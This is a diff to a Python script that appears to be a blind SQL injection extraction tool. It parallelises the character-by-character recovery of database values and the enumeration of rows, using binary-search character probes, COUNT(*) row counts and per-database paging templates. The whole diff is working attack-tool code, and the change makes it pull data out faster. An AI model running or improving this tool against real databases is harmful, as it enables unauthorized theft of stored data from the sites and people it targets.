@@ -451,11 +451,11 @@ def find_char(args, position, query):
     return chr(cs[lo])
 
 
-def _extract_chars(args, query, length, on_progress=None):
+def _extract_chars(args, query, length, on_progress=None, workers=None):
     """Extract `length` characters of `query` in parallel; returns the string."""
     total = min(length, args.max_len)
     chars = {}
-    workers = max(1, args.threads)
+    workers = max(1, workers if workers is not None else args.threads)
     if workers == 1:
         for pos in range(1, total + 1):
             chars[pos] = find_char(args, pos, query)
@@ -477,12 +477,13 @@ def _extract_chars(args, query, length, on_progress=None):
     return "".join(out)
 
 
-def extract_value(args, query):
-    """Length + parallel char extraction, no live output. Returns the string."""
+def extract_value(args, query, workers=None):
+    """Length + char extraction, no live output. Returns the string.
+    `workers` overrides thread count (use 1 when the caller parallelizes rows)."""
     length = find_length(args, query)
     if length == 0:
         return ""
-    return _extract_chars(args, query, length)
+    return _extract_chars(args, query, length, workers=workers)
 
 
 def extract_scalar(args, label=""):
@@ -1026,8 +1027,16 @@ def _row_count(args, base_query):
 
 
 def collect_rows(args, base_query, n):
-    """Extract up to n rows of base_query. Counts rows first, then extracts them
-    all in parallel (across --threads). Falls back to sequential if COUNT fails."""
+    """Extract up to n rows of base_query, always in parallel. Each row uses a
+    single char-worker so total concurrency stays ~--threads (no nested blowup).
+    Uses COUNT(*) when available for an exact one-wave fetch; otherwise pulls
+    rows in parallel batches, stopping at the first empty row."""
+    workers = max(1, args.threads)
+
+    def fetch(i, cw):
+        q = f"{base_query} {PAGE[args.dbms].format(i=i)}"
+        return extract_value(args, q, workers=cw)
+
     cnt = _row_count(args, base_query)
 
     if cnt is not None:
@@ -1035,36 +1044,43 @@ def collect_rows(args, base_query, n):
         if total == 0:
             print("[*] 0 rows.")
             return []
+        # Split the thread budget: few rows -> more char-workers each.
+        cw = max(1, workers // total)
         print(f"[*] {cnt} row(s); extracting {total} in parallel...")
         results = [None] * total
         done = [0]
 
         def one(i):
-            q = f"{base_query} {PAGE[args.dbms].format(i=i)}"
-            r = extract_value(args, q)
-            results[i] = r
+            results[i] = fetch(i, cw)
             done[0] += 1
             sys.stdout.write(f"\r      rows {done[0]}/{total}")
             sys.stdout.flush()
-            return r
 
-        workers = max(1, args.threads)
         with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
             list(ex.map(one, range(total)))
         print()
         return [r for r in results if r]
 
-    # Fallback: sequential, stop at first empty row.
-    print(f"[*] Enumerating up to {n} row(s) (sequential)...")
+    # No COUNT: pull rows in parallel batches; stop at the first empty row.
+    print(f"[*] Enumerating in parallel batches (up to {n})...")
     found = []
-    for i in range(n):
-        q = f"{base_query} {PAGE[args.dbms].format(i=i)}"
-        val = extract_value(args, q)
-        if val == "":
-            break
-        found.append(val)
+    i = 0
+    while i < n:
+        batch = list(range(i, min(i + workers, n)))
+        cw = max(1, workers // len(batch))
+        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+            vals = list(ex.map(lambda j: fetch(j, cw), batch))
+        stop = False
+        for v in vals:
+            if v == "":
+                stop = True
+                break
+            found.append(v)
         sys.stdout.write(f"\r      rows {len(found)}")
         sys.stdout.flush()
+        if stop:
+            break
+        i += workers
     print()
     return found
 
